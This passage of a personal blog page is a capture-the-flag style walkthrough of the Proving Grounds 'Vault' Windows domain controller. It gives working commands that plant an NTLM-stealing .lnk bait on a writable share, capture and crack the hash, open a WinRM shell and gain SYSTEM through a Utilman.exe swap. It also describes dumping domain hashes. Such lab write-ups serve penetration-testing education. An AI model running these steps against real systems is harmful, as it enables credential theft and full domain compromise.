+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/></svg>
+          <p>Kerberos rejects requests when the clock skew exceeds 5 minutes. On its own, <code>ntpdig &lt;IP&gt;</code> only <strong>prints</strong> the offset; to actually set the clock use <code>sudo ntpdig -S &lt;IP&gt;</code> (or <code>sudo ntpdate &lt;IP&gt;</code>). This chain does not use Kerberos in the end (WinRM falls back to NTLM), but synchronising the clock first is a good habit on AD machines.</p>
+        </div>
+
+        <h2>2. Anonymous access attempts</h2>
+        <p>I tried to list users without credentials (a null session, <code>-U '' -N</code>) and ran <code>enum4linux</code>:</p>
+        <pre><code>rpcclient -U '' -N 192.168.154.172
+enum4linux 192.168.154.172</code></pre>
+        <figure class="shot">
+          <img src="/blog/pg-vault-writeup/img/04-rpcclient-enum4linux.png" alt="rpcclient returns NT_STATUS_ACCESS_DENIED and enum4linux aborts" width="922" height="630" loading="lazy">
+          <figcaption>Null sessions over RPC are refused, so <code>enum4linux</code> stops after the session check.</figcaption>
+        </figure>
+        <p><code>NT_STATUS_ACCESS_DENIED</code> means the server's RPC side refuses anonymous (empty username and password) sessions, so there is no user list from here. SMB share listing, however, still works:</p>
+        <pre><code>smbclient -L //192.168.154.172 -N</code></pre>
+        <figure class="shot">
+          <img src="/blog/pg-vault-writeup/img/05-smb-shares.png" alt="Share list: ADMIN$, C$, DocumentsShare, IPC$, NETLOGON, SYSVOL" width="842" height="272" loading="lazy">
+          <figcaption>Besides the default shares there is a non-standard <code>DocumentsShare</code>.</figcaption>
+        </figure>
+        <p><code>DocumentsShare</code> opens anonymously but is empty. On <code>NETLOGON</code> and <code>SYSVOL</code> the connection succeeds while <code>ls</code> returns <code>NT_STATUS_ACCESS_DENIED</code>: an anonymous session can open the share, but has no list or read permission inside it.</p>
+        <figure class="shot">
+          <img src="/blog/pg-vault-writeup/img/07-netlogon-sysvol.png" alt="Listing NETLOGON and SYSVOL fails with NT_STATUS_ACCESS_DENIED" width="480" height="245" loading="lazy">
+          <figcaption>The connection is allowed but listing is not.</figcaption>
+        </figure>
+
+        <h2>3. The detail that matters: is the share writable?</h2>
+        <p>An empty, non-standard share is often a drop box that a user or scheduled task checks. Rather than only reading it, I tested whether I could <strong>write</strong> to it:</p>
+        <pre><code>echo test &gt; test.txt
+smbclient //192.168.154.172/DocumentsShare -N -c 'put test.txt'</code></pre>
+        <figure class="shot">
+          <img src="/blog/pg-vault-writeup/img/08-upload-test.png" alt="test.txt uploaded successfully to DocumentsShare" width="668" height="223" loading="lazy">
+          <figcaption>We can upload anonymously. This is the foothold.</figcaption>
+        </figure>
+
+        <h2>4. Why this works: NTLM and forced authentication</h2>
+        <p><strong>NTLM</strong> (NT LAN Manager) is Microsoft's legacy family of authentication protocols. Modern domains use Kerberos first, but NTLM stays enabled for compatibility and is still used whenever a client connects to a resource by <strong>IP address</strong>.</p>
+        <ul>
+          <li><strong>The NT hash:</strong> Windows does not store passwords in plaintext. The <em>NT hash</em> is the MD4 digest of the UTF-16LE encoded password; on a DC these hashes live in <code>ntds.dit</code>.</li>
+          <li><strong>Challenge-response:</strong> the server sends a random <em>challenge</em>, and the client computes a <em>response</em> from that challenge and its NT hash. The password itself never crosses the network.</li>
+          <li><strong>The weakness:</strong> the client does not verify who it is authenticating to. When Windows touches a path like <code>\\ATTACKER_IP\share\…</code>, it automatically sends the logged-in user's NTLM response to whatever server answers.</li>
+        </ul>
+        <p>What we capture is a <strong>Net-NTLMv2</strong> response. It is not the NT hash, so it <em>cannot</em> be used for pass-the-hash. It can only be cracked offline (hashcat and a wordlist) or relayed to another service. Relay is ruled out here because SMB signing is required, which leaves cracking.</p>
+        <p>The plan:</p>
+        <ol>
+          <li>Create a shortcut (<code>.lnk</code>) whose icon path points to our own IP.</li>
+          <li>Start a fake SMB server on our machine.</li>
+          <li>Drop the <code>.lnk</code> on the writable share.</li>
+          <li>When a user (or a bot simulating one) opens the folder, Explorer tries to load the icon, connects to us, and we capture the hash.</li>
+        </ol>
+
+        <h2>5. Building the bait file: ntlm_theft</h2>
+        <p><a href="https://github.com/Greenwolf/ntlm_theft" rel="noopener" target="_blank">ntlm_theft</a> generates bait files in many formats (<code>.lnk</code>, <code>.url</code>, <code>.scf</code>, <code>.docx</code>, …) that trigger NTLM authentication. I used <code>.lnk</code> because it is a reliable trigger on Windows Explorer. To cover more cases you can generate every format at once with <code>-g all</code>.</p>
+        <pre><code># -s must be OUR tun0 IP, not the target's
+python3 ntlm_theft.py -g lnk -s 192.168.45.160 -f vault</code></pre>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Parameter</th><th>Meaning</th></tr></thead>
+            <tbody>
+              <tr><td><code>-g lnk</code> (<code>--generate</code>)</td><td>Type of bait file to generate. Here: a Windows shortcut.</td></tr>
+              <tr><td><code>-s 192.168.45.160</code> (<code>--server</code>)</td><td>The IP the victim will connect to, which is <strong>our own</strong> VPN (tun0) address where the fake SMB server listens.</td></tr>
+              <tr><td><code>-f vault</code> (<code>--filename</code>)</td><td>Output name. Produces <code>vault/vault.lnk</code>.</td></tr>
+            </tbody>
+          </table>
+        </div>
+        <figure class="shot">
+          <img src="/blog/pg-vault-writeup/img/09-ntlm-theft.png" alt="ntlm_theft creates vault/vault.lnk" width="738" height="330" loading="lazy">
+          <figcaption>My first run: here <code>-s</code> was set to the <strong>target's</strong> IP (<code>192.168.154.172</code>), which is wrong.</figcaption>
+        </figure>
+        <div class="callout">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 9v4M12 17h.01"/><path d="M10.3 3.9 1.8 18a2 2 0 0 0 1.7 3h17a2 2 0 0 0 1.7-3L13.7 3.9a2 2 0 0 0-3.4 0z"/></svg>
+          <p><strong>A common mistake:</strong> <code>-s</code> is not the target's address. It is the address where <em>you</em> listen. A <code>.lnk</code> pointing at the target makes the victim try to authenticate to itself, and your listener sees nothing. Check your IP with <code>ip -4 addr show tun0</code>.</p>
+        </div>
+
+        <h2>6. Listener: impacket-smbserver vs Responder</h2>
+        <p>My first try was <code>impacket-smbserver</code>, which produced no hash:</p>
+        <pre><code>impacket-smbserver test . -smb2support</code></pre>
+        <figure class="shot">
+          <img src="/blog/pg-vault-writeup/img/10-impacket-smbserver.png" alt="impacket-smbserver started, no incoming connection" width="644" height="132" loading="lazy">
+          <figcaption>The server starts, but no connection comes in.</figcaption>
+        </figure>
+        <p>With Responder, uploading the file again captured the hash:</p>
+        <pre><code>sudo responder -I tun0
+smbclient //192.168.154.172/DocumentsShare -N -c 'put vault.lnk'</code></pre>
+        <figure class="shot">
+          <img src="/blog/pg-vault-writeup/img/11-put-lnk.png" alt="vault.lnk uploaded to DocumentsShare" width="630" height="143" loading="lazy">
+        </figure>
+        <figure class="shot">
+          <img src="/blog/pg-vault-writeup/img/12-responder-hash.png" alt="Responder captures the NTLMv2-SSP hash for VAULT\anirudh" width="910" height="286" loading="lazy">
+          <figcaption>Responder captured the Net-NTLMv2 hash for <code>VAULT\anirudh</code>.</figcaption>
+        </figure>
+        <div class="callout callout-info">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/></svg>
+          <p><strong>So why did impacket fail?</strong> In my notes I had first blamed a share-name mismatch and LLMNR poisoning. Neither explanation holds. NTLM authentication happens during SMB <em>session setup</em>, before any share name is checked, so <code>impacket-smbserver</code> prints the hash whatever the share is called. LLMNR/NBT-NS poisoning works on broadcast name lookups, does not cross the VPN, and is not needed when the victim connects straight to an IP. <code>-smb2support</code> was already set. The most likely causes are that the <code>.lnk</code> still pointed at the wrong IP (previous section), or that the bot on the target only browses the share every few minutes and the server was stopped before it did. Both tools work for this attack; just make sure the bait points at your IP and wait long enough.</p>
+        </div>
+
+        <h2>7. Cracking the hash</h2>
+        <p>The hash format is <code>user::DOMAIN:challenge:NTProofStr:blob</code>; the hashcat mode is <code>5600</code> (NetNTLMv2):</p>
+        <pre><code>echo 'anirudh::VAULT:2227191f219be214:…' &gt; hash.txt
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
+        <figure class="shot">
+          <img src="/blog/pg-vault-writeup/img/14-hashcat-cracked.png" alt="hashcat Status: Cracked, password SecureHM" width="1165" height="643" loading="lazy">
+          <figcaption>Cracked in a few seconds: <code>anirudh : SecureHM</code>.</figcaption>
+        </figure>
+
+        <h2>8. Foothold: WinRM</h2>
+        <p>With port 5985 open, the credentials turn straight into a PowerShell session:</p>
+        <pre><code>evil-winrm -i 192.168.154.172 -u anirudh -p 'SecureHM'</code></pre>
+        <figure class="shot">
+          <img src="/blog/pg-vault-writeup/img/15-evil-winrm.png" alt="evil-winrm session as anirudh" width="972" height="298" loading="lazy">
+        </figure>
+        <figure class="shot">
+          <img src="/blog/pg-vault-writeup/img/16-local-txt.png" alt="local.txt on anirudh's desktop (flag redacted)" width="929" height="367" loading="lazy">
+          <figcaption><code>local.txt</code> is on <code>C:\Users\anirudh\Desktop</code> (flag redacted).</figcaption>
+        </figure>
+
+        <h2>9. Privilege escalation: SeRestorePrivilege</h2>
+        <pre><code>whoami /priv</code></pre>
+        <figure class="shot">
+          <img src="/blog/pg-vault-writeup/img/17-whoami-priv.png" alt="whoami /priv: SeBackupPrivilege and SeRestorePrivilege enabled" width="720" height="312" loading="lazy">
+          <figcaption>Several dangerous privileges are <strong>Enabled</strong>, including <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code>.</figcaption>
+        </figure>
+        <p>Several paths are possible from here. I picked <code>SeRestorePrivilege</code> because it is the simplest:</p>
+        <ul>
+          <li><strong>What it grants:</strong> <code>SeRestorePrivilege</code> exists so backups can be restored. It lets the holder <strong>write to and replace</strong> any file, regardless of its ACL. (Bypassing ACLs to <em>read</em> any file is <code>SeBackupPrivilege</code>.)</li>
+          <li><strong>Utilman.exe:</strong> pressing <strong>Win+U</strong> or the Ease of Access icon on the login screen launches <code>C:\Windows\System32\Utilman.exe</code>. No user is logged in on the login screen, so Winlogon starts it as <code>NT AUTHORITY\SYSTEM</code>.</li>
+          <li><strong>The idea:</strong> if we put <code>cmd.exe</code> in place of <code>Utilman.exe</code>, Win+U gives us a SYSTEM command prompt.</li>
+        </ul>
+        <pre><code>cd C:\Windows\System32
+ren Utilman.exe Utilman.old
+ren cmd.exe Utilman.exe</code></pre>
+        <figure class="shot">
+          <img src="/blog/pg-vault-writeup/img/18-utilman-swap.png" alt="Renaming Utilman.exe and cmd.exe in System32" width="689" height="106" loading="lazy">
+        </figure>
+        <p>Then I connected to RDP, but did not log in. I only needed the login screen:</p>
+        <pre><code>rdesktop 192.168.154.172</code></pre>
+        <figure class="shot">
+          <img src="/blog/pg-vault-writeup/img/19-rdp-login.png" alt="Windows login screen over RDP" width="1028" height="797" loading="lazy">
+          <figcaption>On the login screen, press Win+U.</figcaption>
+        </figure>
+        <figure class="shot">
+          <img src="/blog/pg-vault-writeup/img/20-system-shell.png" alt="cmd.exe running in place of utilman.exe on the login screen" width="1020" height="805" loading="lazy">
+          <figcaption>Instead of Ease of Access, <code>cmd.exe</code> opens with SYSTEM privileges.</figcaption>
+        </figure>
+        <figure class="shot">
+          <img src="/blog/pg-vault-writeup/img/21-proof-txt.png" alt="proof.txt on the Administrator desktop (flag redacted)" width="613" height="151" loading="lazy">
+          <figcaption><code>proof.txt</code> is on <code>C:\Users\Administrator\Desktop</code> (flag redacted).</figcaption>
+        </figure>
+
+        <div class="callout callout-info">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/></svg>
+          <p><strong>Clean up.</strong> The commands above leave the system without a <code>cmd.exe</code>. In a lab it does not matter, but in a real engagement put the files back when you are done: <code>ren Utilman.exe cmd.exe</code> then <code>ren Utilman.old Utilman.exe</code>. Also, if a privilege shows as <em>Disabled</em> in <code>whoami /priv</code>, it has to be enabled first (for example with the <code>EnableSeRestorePrivilege.ps1</code> script). On Vault it was already <em>Enabled</em>.</p>
+        </div>
+
+        <h2>Alternative paths</h2>
+        <ul>
+          <li><strong>SeBackupPrivilege:</strong> the same account can read any file as well. On a DC that means taking a shadow copy with <code>diskshadow</code> and copying <code>ntds.dit</code> with <code>robocopy /b</code>, then dumping every domain hash with <code>impacket-secretsdump</code>.</li>
+          <li><strong>AD permissions:</strong> collecting data with BloodHound and checking what <code>anirudh</code> has rights over (for example, Group Policy objects) is worth doing. One of the public writeups describes a second technique; I have not tried it yet.</li>
+        </ul>
+
+        <h2>Lessons learned</h2>
+        <ul>
+          <li>Do not stop at reading an anonymous share. <strong>Test write access</strong> as well. An empty, non-standard share is often a drop box someone is watching.</li>
+          <li>In <code>ntlm_theft</code> and any other bait file, the address is <strong>yours</strong>, not the target's.</li>
+          <li>When a tool "doesn't work", find out why before reaching for the next one: the timing, the IP and the protocol.</li>
+          <li>Read the nmap output twice: <em>signing required</em> rules out relaying, and an open 5985 tells you how cracked credentials become a shell.</li>
+          <li><code>SeBackup</code>/<code>SeRestore</code>-style privileges are effectively administrator rights on their own.</li>
+        </ul>
+
+        <h2>References</h2>
+        <ul>
+          <li><a href="https://medium.com/@Tvrpism/vault-proving-grounds-walkthrough-73bac067c13c" rel="noopener" target="_blank">Vault — Proving Grounds Walkthrough (Medium, @Tvrpism)</a></li>
+          <li><a href="https://github.com/Greenwolf/ntlm_theft" rel="noopener" target="_blank">Greenwolf/ntlm_theft</a></li>
+          <li><a href="https://github.com/lgandx/Responder" rel="noopener" target="_blank">lgandx/Responder</a></li>
+        </ul>
+      </article>
+
+    </div>
+  </main>
+
+  <footer class="site-footer">
+    <div class="container footer-inner">
+      <div class="footer-meta">
+        <p>&copy; 2026 Hüseyin Kalkan. <span class="t-tr">Tüm hakları saklıdır.</span><span class="t-en" lang="en">All rights reserved.</span></p>
+        <p class="contact-line">
+          <a href="mailto:info@huseyinkalkan.net">info@huseyinkalkan.net</a>
+          <span aria-hidden="true">·</span>
+          <a href="tel:+905365071963">+90 536 507 19 63</a>
+        </p>
+      </div>
+      <div class="social">
+        <a href="https://www.linkedin.com/in/huseyinkalkann/" rel="me noopener" target="_blank" aria-label="LinkedIn">
+          <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M20.45 20.45h-3.56v-5.57c0-1.33-.03-3.04-1.85-3.04-1.86 0-2.14 1.45-2.14 2.94v5.67H9.35V9h3.41v1.56h.05c.48-.9 1.63-1.85 3.36-1.85 3.6 0 4.27 2.37 4.27 5.45v6.29zM5.34 7.43a2.06 2.06 0 1 1 0-4.13 2.06 2.06 0 0 1 0 4.13zM7.12 20.45H3.55V9h3.57v11.45zM22.22 0H1.77C.79 0 0 .77 0 1.72v20.56C0 23.23.79 24 1.77 24h20.45c.98 0 1.78-.77 1.78-1.72V1.72C24 .77 23.2 0 22.22 0z"/></svg>
+        </a>
+        <a href="https://github.com/thehuseyinkalkan" rel="me noopener" target="_blank" aria-label="GitHub">
+          <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 .5A11.5 11.5 0 0 0 .5 12a11.5 11.5 0 0 0 7.86 10.92c.58.1.79-.25.79-.56v-2c-3.2.7-3.88-1.37-3.88-1.37-.53-1.34-1.29-1.7-1.29-1.7-1.05-.72.08-.7.08-.7 1.16.08 1.77 1.2 1.77 1.2 1.03 1.77 2.7 1.26 3.36.96.1-.75.4-1.26.73-1.55-2.56-.3-5.25-1.28-5.25-5.7 0-1.26.45-2.29 1.19-3.1-.12-.3-.52-1.47.11-3.07 0 0 .97-.31 3.18 1.18a11 11 0 0 1 5.8 0c2.2-1.49 3.17-1.18 3.17-1.18.63 1.6.23 2.77.12 3.06.74.82 1.18 1.85 1.18 3.11 0 4.43-2.69 5.4-5.26 5.69.41.36.78 1.06.78 2.14v3.17c0 .31.2.67.8.56A11.5 11.5 0 0 0 23.5 12 11.5 11.5 0 0 0 12 .5z"/></svg>
+        </a>
+        <a href="mailto:info@huseyinkalkan.net" aria-label="E-posta: info@huseyinkalkan.net">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-10 6L2 7"/></svg>
+        </a>
+        <a href="tel:+905365071963" aria-label="Telefon: +90 536 507 19 63">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6A19.79 19.79 0 0 1 2.12 4.22 2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72c.13.96.36 1.9.7 2.81a2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.91.34 1.85.57 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
+        </a>
+      </div>
+    </div>
+  </footer>
+
+  <script src="/assets/js/main.js" defer></script>
+</body>
+</html>
